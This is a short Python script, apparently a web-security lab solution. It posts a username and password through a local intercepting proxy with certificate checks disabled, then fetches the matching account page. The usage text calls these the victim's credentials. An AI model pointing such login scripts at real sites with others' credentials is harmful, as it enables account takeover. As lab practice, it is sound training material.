import requests
import urllib3
import sys
#dedoxd2

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploitation(url:str , username:str , passwd:str):
    session = requests.sessions.Session()
    params = {"username":username,"password":passwd}
    r = session.post(url , proxies=proxies,data=params,verify=False , allow_redirects=False)
    
    response = session.get(url.replace("login",f"my-account?id={username}"),proxies=proxies,verify=False ) 

    if response.status_code == 200:
        print("(+) The lab solved successfully !!")
    else: 
        print("(-) Something wen wrong !!")



if __name__ == "__main__":
    try:
        url = sys.argv[1]
        username = sys.argv[2]
        pasword = sys.argv[3]
        exploitation(url, username , pasword)

    except RuntimeError:
        print(RuntimeError)
        print("(-) Usage: %s '<url>'  'username' 'password' "%sys.argv[0])
        print("(-) Example: %s 'https://www.example.com/login' 'victim_username' 'victim_password" %sys.argv[0] , sys.argv[1] , sys.argv[2])
        sys.exit(-1)
